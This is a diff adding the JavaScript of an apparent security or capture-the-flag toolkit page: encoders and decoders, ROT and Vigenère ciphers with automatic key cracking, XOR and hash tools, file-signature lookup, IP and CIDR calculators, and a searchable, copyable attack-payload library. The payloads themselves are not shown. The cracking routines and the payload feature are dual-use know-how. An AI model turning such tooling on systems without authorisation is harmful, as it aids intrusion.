+          const yOffset = -80; // offset for nav height
+          const y = mainContainer.getBoundingClientRect().top + window.pageYOffset + yOffset;
+          window.scrollTo({ top: y, behavior: 'smooth' });
+        }
+      }
+    });
+  });
+
+  // Toasts & Copy
+  function showToast(message) {
+    const container = document.getElementById('toast-container');
+    const toast = document.createElement('div');
+    toast.className = 'toast';
+    toast.innerText = message;
+    container.appendChild(toast);
+    setTimeout(() => {
+      toast.style.opacity = '0';
+      toast.style.transition = 'opacity 0.3s';
+      setTimeout(() => toast.remove(), 300);
+    }, 2000);
+  }
+
+  function copyResult(elementId) {
+    const el = document.getElementById(elementId);
+    if (!el || el.classList.contains('empty')) return;
+    
+    // We only want the text, not the button text
+    const textNode = Array.from(el.childNodes).filter(node => node.nodeType === Node.TEXT_NODE).map(node => node.textContent).join('');
+    
+    navigator.clipboard.writeText(textNode).then(() => {
+      showToast('Copied to clipboard');
+    });
+  }
+
+  function setOutput(elementId, value) {
+    const el = document.getElementById(elementId);
+    if (!value) {
+      el.classList.add('empty');
+      // Keep the button if it exists
+      const btnHtml = el.innerHTML.includes('<button') ? '<button class="copy-btn" onclick="copyResult(\'' + elementId + '\')">Copy</button>' : '';
+      el.innerHTML = '...' + btnHtml;
+      return;
+    }
+    el.classList.remove('empty');
+    const btnHtml = el.innerHTML.includes('<button') ? '<button class="copy-btn" onclick="copyResult(\'' + elementId + '\')">Copy</button>' : '';
+    el.innerHTML = value + btnHtml;
+  }
+
+  // --- Tool: Decoder Ring ---
+  function decodeRun(action) {
+    const input = document.getElementById('decoder-in').value;
+    if (!input) { setOutput('decoder-out', ''); return; }
+    
+    let out = '';
+    try {
+      if (action === 'b64enc') out = btoa(input);
+      else if (action === 'b64dec') out = atob(input);
+      else if (action === 'urlenc') out = encodeURIComponent(input);
+      else if (action === 'urldec') out = decodeURIComponent(input);
+      else if (action === 'hexenc') {
+        out = input.split('').map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join(' ');
+      }
+      else if (action === 'hexdec') {
+        const hex = input.replace(/[^0-9a-fA-F]/g, '');
+        for (let i = 0; i < hex.length; i += 2) {
+          out += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
+        }
+      }
+      setOutput('decoder-out', out);
+    } catch (e) {
+      setOutput('decoder-out', 'Error: Invalid input for this operation.');
+    }
+  }
+
+  // --- Tool: ROT Cipher ---
+  function rotRun(mode) {
+    const input = document.getElementById('rot-in').value;
+    if (!input) { setOutput('rot-out', ''); return; }
+    
+    function shiftChar(c, shift) {
+      const code = c.charCodeAt(0);
+      if (code >= 65 && code <= 90) return String.fromCharCode(((code - 65 + shift) % 26) + 65);
+      if (code >= 97 && code <= 122) return String.fromCharCode(((code - 97 + shift) % 26) + 97);
+      return c;
+    }
+
+    if (mode === 'encode' || mode === 'shift') {
+      const s = parseInt(document.getElementById('rot-shift').value) || 0;
+      const out = input.split('').map(c => shiftChar(c, s)).join('');
+      setOutput('rot-out', out);
+    } else if (mode === 'decode') {
+      const s = parseInt(document.getElementById('rot-shift').value) || 0;
+      const out = input.split('').map(c => shiftChar(c, 26 - (s % 26))).join('');
+      setOutput('rot-out', out);
+    } else if (mode === 'auto') {
+      const alphaOnly = input.replace(/[^A-Za-z]/g, '').toUpperCase();
+      if (alphaOnly.length < 4) { setOutput('rot-out', 'Need more text for auto-decode'); return; }
+      const engFreq = [0.08167, 0.01492, 0.02782, 0.04253, 0.12702, 0.02228, 0.02015, 0.06094, 0.06966, 0.00153, 0.00772, 0.04025, 0.02406, 0.06749, 0.07507, 0.01929, 0.00095, 0.05987, 0.06327, 0.09056, 0.02758, 0.00978, 0.02360, 0.00150, 0.01974, 0.00074];
+      
+      let bestShift = 0;
+      let minChi = Infinity;
+      for (let shift = 0; shift < 26; shift++) {
+        let decoded = alphaOnly.split('').map(c => shiftChar(c, 26 - shift)).join('');
+        let counts = new Array(26).fill(0);
+        for(let i = 0; i < decoded.length; i++) counts[decoded.charCodeAt(i) - 65]++;
+        
+        let chi = 0;
+        for(let i = 0; i < 26; i++) {
+          let expected = alphaOnly.length * engFreq[i];
+          if(expected > 0) chi += Math.pow(counts[i] - expected, 2) / expected;
+        }
+        if (chi < minChi) {
+          minChi = chi;
+          bestShift = shift;
+        }
+      }
+      
+      const decodedText = input.split('').map(c => shiftChar(c, 26 - bestShift)).join('');
+      document.getElementById('rot-shift').value = bestShift;
+      setOutput('rot-out', `[Best Shift Found: ${bestShift}]\n\n${decodedText}`);
+    } else {
+      let out = '';
+      for (let s = 1; s <= 25; s++) {
+        out += `[Shift ${s.toString().padStart(2, '0')}]: ${input.split('').map(c => shiftChar(c, s)).join('')}\n`;
+      }
+      setOutput('rot-out', out);
+    }
+  }
+
+  // --- Tool: Vigenère Cipher ---
+  function vigenereRun(mode) {
+    const input = document.getElementById('vigenere-in').value;
+    
+    if (mode === 'auto') {
+      const alphaOnly = input.replace(/[^A-Za-z]/g, '').toUpperCase();
+      if (alphaOnly.length < 8) { setOutput('vigenere-out', 'Need more text for auto-decode (at least 8-10 chars).'); return; }
+      
+      const engFreq = [0.08167, 0.01492, 0.02782, 0.04253, 0.12702, 0.02228, 0.02015, 0.06094, 0.06966, 0.00153, 0.00772, 0.04025, 0.02406, 0.06749, 0.07507, 0.01929, 0.00095, 0.05987, 0.06327, 0.09056, 0.02758, 0.00978, 0.02360, 0.00150, 0.01974, 0.00074];
+      let bestLen = 1;
+      let maxScore = -Infinity;
+
+      for (let l = 1; l <= Math.min(20, alphaOnly.length / 2); l++) {
+        let avgIoc = 0;
+        let validCols = 0;
+        for (let i = 0; i < l; i++) {
+          let counts = new Array(26).fill(0);
+          let tot = 0;
+          for (let j = i; j < alphaOnly.length; j += l) {
+            counts[alphaOnly.charCodeAt(j) - 65]++;
+            tot++;
+          }
+          if (tot > 1) {
+            let sum = 0;
+            for (let c of counts) sum += c * (c - 1);
+            avgIoc += sum / (tot * (tot - 1));
+            validCols++;
+          }
+        }
+        if (validCols > 0) {
+          avgIoc /= validCols;
+          if (avgIoc > maxScore) { maxScore = avgIoc; bestLen = l; }
+        }
+      }
+
+      let key = '';
+      for (let i = 0; i < bestLen; i++) {
+        let counts = new Array(26).fill(0);
+        let tot = 0;
+        for (let j = i; j < alphaOnly.length; j += bestLen) {
+          counts[alphaOnly.charCodeAt(j) - 65]++;
+          tot++;
+        }
+        let bestShift = 0;
+        let minChi = Infinity;
+        for (let shift = 0; shift < 26; shift++) {
+          let chi = 0;
+          for (let c = 0; c < 26; c++) {
+            let obs = counts[(c + shift) % 26];
+            let exp = tot * engFreq[c];
+            if (exp > 0) chi += Math.pow(obs - exp, 2) / exp;
+          }
+          if (chi < minChi) { minChi = chi; bestShift = shift; }
+        }
+        key += String.fromCharCode(bestShift + 65);
+      }
+
+      document.getElementById('vigenere-key').value = key;
+      vigenereRun('decode');
+      
+      const decodedText = document.getElementById('vigenere-out').innerText;
+      setOutput('vigenere-out', `<div style="margin-bottom:0.5rem;color:var(--accent);">Cracked Key: <b>${key}</b> (Length: ${bestLen})</div>` + decodedText);
+      return;
+    }
+
+    const key = document.getElementById('vigenere-key').value.toUpperCase().replace(/[^A-Z]/g, '');
+    if (!input || !key) { setOutput('vigenere-out', 'Input and alphabetic key required.'); return; }
+
+    let out = '';
+    let keyIdx = 0;
+
+    for (let i = 0; i < input.length; i++) {
+      const char = input[i];
+      const code = char.charCodeAt(0);
+      const isUpper = (code >= 65 && code <= 90);
+      const isLower = (code >= 97 && code <= 122);
+
+      if (isUpper || isLower) {
+        const base = isUpper ? 65 : 97;
+        const p = code - base;
+        const k = key.charCodeAt(keyIdx % key.length) - 65;
+        
+        let c;
+        if (mode === 'encode') {
+          c = (p + k) % 26;
+        } else {
+          c = (p - k + 26) % 26;
+        }
+        
+        out += String.fromCharCode(c + base);
+        keyIdx++;
+      } else {
+        out += char;
+      }
+    }
+    setOutput('vigenere-out', out);
+  }
+
+  // --- Tool: XOR Tool ---
+  function xorRun() {
+    let input = document.getElementById('xor-in').value.trim();
+    let key = document.getElementById('xor-key').value.trim();
+    if (!input || !key) return;
+
+    // Detect if inputs are hex (remove spaces and check)
+    const isHex = (str) => /^[0-9a-fA-F]+$/.test(str.replace(/\s/g, ''));
+    
+    let inBytes = [];
+    if (isHex(input)) {
+      const hex = input.replace(/\s/g, '');
+      for(let i=0; i<hex.length; i+=2) inBytes.push(parseInt(hex.substr(i,2), 16));
+    } else {
+      for(let i=0; i<input.length; i++) inBytes.push(input.charCodeAt(i));
+    }
+
+    let keyBytes = [];
+    if (isHex(key)) {
+      const hex = key.replace(/\s/g, '');
+      for(let i=0; i<hex.length; i+=2) keyBytes.push(parseInt(hex.substr(i,2), 16));
+    } else {
+      for(let i=0; i<key.length; i++) keyBytes.push(key.charCodeAt(i));
+    }
+
+    if(keyBytes.length === 0) return;
+
+    let outHex = [];
+    let outAscii = '';
+    for(let i=0; i<inBytes.length; i++) {
+      let x = inBytes[i] ^ keyBytes[i % keyBytes.length];
+      outHex.push(x.toString(16).padStart(2, '0'));
+      outAscii += (x >= 32 && x <= 126) ? String.fromCharCode(x) : '.';
+    }
+
+    setOutput('xor-out-hex', outHex.join(' '));
+    setOutput('xor-out-ascii', outAscii);
+  }
+
+  // --- Tool: Hash Generator ---
+  async function hashRun() {
+    const input = document.getElementById('hashgen-in').value;
+    if (!input) {
+      setOutput('hashgen-md5', '');
+      setOutput('hashgen-sha1', '');
+      setOutput('hashgen-sha256', '');
+      setOutput('hashgen-sha512', '');
+      return;
+    }
+
+    // MD5 via CryptoJS
+    if (window.CryptoJS) {
+      setOutput('hashgen-md5', CryptoJS.MD5(input).toString());
+    }
+
+    // SHA family via WebCrypto
+    const encoder = new TextEncoder();
+    const data = encoder.encode(input);
+
+    const hashToHex = async (algo, outId) => {
+      const hashBuffer = await crypto.subtle.digest(algo, data);
+      const hashArray = Array.from(new Uint8Array(hashBuffer));
+      const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+      setOutput(outId, hashHex);
+    };
+
+    hashToHex('SHA-1', 'hashgen-sha1');
+    hashToHex('SHA-256', 'hashgen-sha256');
+    hashToHex('SHA-512', 'hashgen-sha512');
+  }
+
+  // --- Tool: Hash Identifier ---
+  function hashIdRun() {
+    const input = document.getElementById('hashid-in').value.trim();
+    if (!input) { setOutput('hashid-out', ''); return; }
+
+    const len = input.length;
+    const isHex = /^[0-9a-fA-F]+$/.test(input);
+    const isB64 = /^[a-zA-Z0-9+/]+={0,2}$/.test(input);
+    const isNum = /^[0-9]+$/.test(input);
+    
+    let matches = [];
+
+    if (/^[0-9a-fA-F]{32}:[0-9a-fA-F]{32}$/.test(input)) {
+      matches.push('Windows LM/NTLM Pair');
+    }
+    if (/^[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$/.test(input)) {
+      matches.push('JSON Web Token (JWT)');
+    }
+    
+    if (isHex) {
+      if (len === 32) matches.push('MD5', 'MD4', 'NTLM', 'MD2');
+      if (len === 40) matches.push('SHA-1', 'RIPEMD-160');
+      if (len === 56) matches.push('SHA-224', 'SHA3-224');
+      if (len === 64) matches.push('SHA-256', 'RIPEMD-256', 'SHA3-256');
+      if (len === 96) matches.push('SHA-384');
+      if (len === 128) matches.push('SHA-512', 'Whirlpool');
+    }
+    
+    if (input.startsWith('$1$')) matches.push('MD5 Crypt');
+    if (input.startsWith('$2a$') || input.startsWith('$2b$') || input.startsWith('$2y$')) matches.push('Bcrypt');
+    if (input.startsWith('$5$')) matches.push('SHA-256 Crypt');
+    if (input.startsWith('$6$')) matches.push('SHA-512 Crypt');
+    
+    if (matches.length > 0) {
+      const el = document.getElementById('hashid-out');
+      el.classList.remove('empty');
+      el.innerHTML = matches.map(m => `> ${m}`).join('<br>');
+    } else {
+      setOutput('hashid-out', 'No definitive matches found for this length/format.');
+    }
+  }
+
+  // --- Tool: Magic Bytes ---
+  function magicRun() {
+    let input = document.getElementById('magic-in').value.trim().toUpperCase().replace(/\s/g, '');
+    if (!input) { setOutput('magic-out', ''); return; }
+
+    const sigs = [
+      { hex: '89504E47', type: 'PNG Image' },
+      { hex: 'FFD8FF', type: 'JPEG Image' },
+      { hex: '25504446', type: 'PDF Document' },
+      { hex: '504B0304', type: 'ZIP Archive' },
+      { hex: '7F454C46', type: 'ELF Executable (Linux)' },
+      { hex: '47494638', type: 'GIF Image' },
+      { hex: '4D5A', type: 'PE Executable (Windows DOS/EXE)' },
+      { hex: '377ABCAF271C', type: '7z Archive' },
+      { hex: '526172211A07', type: 'RAR Archive' },
+      { hex: '00000018667479706D703432', type: 'MP4 Video' },
+      { hex: 'CAFEBABE', type: 'Java Class File' },
+    ];
+
+    let match = null;
+    for (let s of sigs) {
+      if (input.startsWith(s.hex)) {
+        match = s; break;
+      }
+    }
+
+    if (match) {
+      setOutput('magic-out', `<span style="color: var(--red-bright)">Found:</span> ${match.type}`);
+    } else {
+      setOutput('magic-out', 'Unknown or incomplete signature.');
+    }
+  }
+
+  // --- Tool: Timestamp Converter ---
+  function timeUnixRun() {
+    const input = document.getElementById('time-unix-in').value;
+    if (!input) { setOutput('time-unix-out', ''); return; }
+    
+    // JS dates need ms
+    let ts = parseInt(input);
+    if(input.length <= 10) ts *= 1000;
+    
+    const d = new Date(ts);
+    if (isNaN(d.getTime())) { setOutput('time-unix-out', 'Invalid timestamp'); return; }
+
+    const now = new Date();
+    const diff = Math.floor((now - d) / 1000);
+    let diffStr = '';
+    if (diff > 0) {
+      if (diff < 60) diffStr = `${diff} seconds ago`;
+      else if (diff < 3600) diffStr = `${Math.floor(diff/60)} minutes ago`;
+      else if (diff < 86400) diffStr = `${Math.floor(diff/3600)} hours ago`;
+      else diffStr = `${Math.floor(diff/86400)} days ago`;
+    } else {
+      diffStr = 'In the future';
+    }
+
+    setOutput('time-unix-out', `UTC:   ${d.toUTCString()}\nLocal: ${d.toString()}\nTime:  ${diffStr}`);
+  }
+
+  function timeDateRun() {
+    const input = document.getElementById('time-date-in').value;
+    if (!input) { setOutput('time-date-out', ''); return; }
+    const d = new Date(input);
+    const ts = Math.floor(d.getTime() / 1000);
+    setOutput('time-date-out', ts.toString());
+  }
+
+  // --- Tool: IP Converter ---
+  function ipRun() {
+    const input = document.getElementById('ip-in').value.trim();
+    if (!input) { 
+      setOutput('ip-out-hex', ''); setOutput('ip-out-int', ''); setOutput('ip-out-bin', '');
+      return; 
+    }
+
+    const parts = input.split('.');
+    if (parts.length !== 4) return;
+    
+    let isV4 = true;
+    let bytes = [];
+    for(let p of parts) {
+      const num = parseInt(p);
+      if(isNaN(num) || num < 0 || num > 255) isV4 = false;
+      bytes.push(num);
+    }
+    
+    if(!isV4) return;
+
+    // Hex
+    const hex = '0x' + bytes.map(b => b.toString(16).padStart(2, '0')).join('');
+    // Int
+    const int = (bytes[0] << 24 | bytes[1] << 16 | bytes[2] << 8 | bytes[3]) >>> 0;
+    // Bin
+    const bin = bytes.map(b => b.toString(2).padStart(8, '0')).join('.');
+
+    setOutput('ip-out-hex', hex);
+    setOutput('ip-out-int', int.toString());
+    setOutput('ip-out-bin', bin);
+  }
+
+  // --- Tool: CIDR Calculator ---
+  function cidrRun() {
+    const input = document.getElementById('cidr-in').value.trim();
+    if (!input) { setOutput('cidr-out', ''); return; }
+
+    const [ipStr, cidrStr] = input.split('/');
+    if (!ipStr || !cidrStr) return;
+    
+    const cidr = parseInt(cidrStr);
+    if (isNaN(cidr) || cidr < 0 || cidr > 32) return;
+
+    const parts = ipStr.split('.');
+    if (parts.length !== 4) return;
+    
+    const ipInt = (parseInt(parts[0]) << 24 | parseInt(parts[1]) << 16 | parseInt(parts[2]) << 8 | parseInt(parts[3])) >>> 0;
+    
+    // Mask
+    const maskInt = cidr === 0 ? 0 : (~0 << (32 - cidr)) >>> 0;
+    
+    // Network Address (IP AND Mask)
+    const netInt = (ipInt & maskInt) >>> 0;
+    
+    // Broadcast Address (Network OR Inverted Mask)
+    const bcastInt = (netInt | (~maskInt)) >>> 0;
+
+    const intToIp = (i) => `${(i >>> 24) & 255}.${(i >>> 16) & 255}.${(i >>> 8) & 255}.${i & 255}`;
+
+    let totalHosts = 0;
+    let firstHost = 'N/A';
+    let lastHost = 'N/A';
+
+    if (cidr === 32) {
+      totalHosts = 1;
+      firstHost = intToIp(netInt);
+      lastHost = intToIp(netInt);
+    } else if (cidr === 31) {
+      totalHosts = 2;
+      firstHost = intToIp(netInt);
+      lastHost = intToIp(bcastInt);
+    } else {
+      totalHosts = Math.pow(2, 32 - cidr) - 2;
+      firstHost = intToIp(netInt + 1);
+      lastHost = intToIp(bcastInt - 1);
+    }
+
+    let out = `Network ID:    ${intToIp(netInt)}\n`;
+    out += `Subnet Mask:   ${intToIp(maskInt)}\n`;
+    out += `Broadcast IP:  ${intToIp(bcastInt)}\n`;
+    out += `First Host:    ${firstHost}\n`;
+    out += `Last Host:     ${lastHost}\n`;
+    out += `Total Hosts:   ${totalHosts}`;
+
+    const el = document.getElementById('cidr-out');
+    el.classList.remove('empty');
+    el.innerHTML = out;
+  }
+
+  // --- Tool: Payload Drop ---
+  function filterPayloads() {
+    const q = document.getElementById('payload-search').value.toLowerCase();
+    const categories = document.querySelectorAll('.payload-category');
+    
+    categories.forEach(cat => {
+      let hasMatch = false;
+      const items = cat.querySelectorAll('.payload-item');
+      
+      // Never hide the static info items in IDOR section
+      if(cat.dataset.category === 'Open Redirect & IDOR') {
+         // check if there's any copyable payload match
+         items.forEach(item => {
+           if(item.querySelector('button')) {
+             if(item.innerText.toLowerCase().includes(q)) {
+               item.style.display = 'flex';
+               hasMatch = true;
+             } else {
+               item.style.display = 'none';
+             }
+           } else {
+             // always show tips if category is shown
+             item.style.display = 'flex';
+           }
+         });
+         // Show category if q is empty, or if matched
+         cat.style.display = (q === '' || hasMatch) ? 'block' : 'none';
+         return;
+      }
+
+      items.forEach(item => {
+        const text = item.innerText.toLowerCase();
+        if (text.includes(q)) {
+          item.style.display = 'flex';
+          hasMatch = true;
+        } else {
+          item.style.display = 'none';
+        }
+      });
+
+      if (hasMatch || q === '') {
+        cat.style.display = 'block';
+      } else {
+        cat.style.display = 'none';
+      }
+    });
+  }
+
+  function copyPayload(btn) {
+    const codeEl = btn.previousElementSibling;
+    const text = codeEl.innerText;
+    navigator.clipboard.writeText(text).then(() => {
+      showToast('Payload copied');
+    });
+  }
+
+  function copyTemplatePayload(btn) {
+    const codeEl = btn.previousElementSibling;
+    const template = codeEl.getAttribute('data-template');
+    const inputs = codeEl.querySelectorAll('input');
+    
+    let finalPayload = template;
+    inputs.forEach((input, index) => {
+      // If user typed nothing, use placeholder as fallback
+      const val = input.value || input.placeholder || '';
+      finalPayload = finalPayload.replace(`$$${index}$$`, val);
+    });
+
+    navigator.clipboard.writeText(finalPayload).then(() => {
+      showToast('Payload generated & copied');
+    });
+  }
+
+</script>
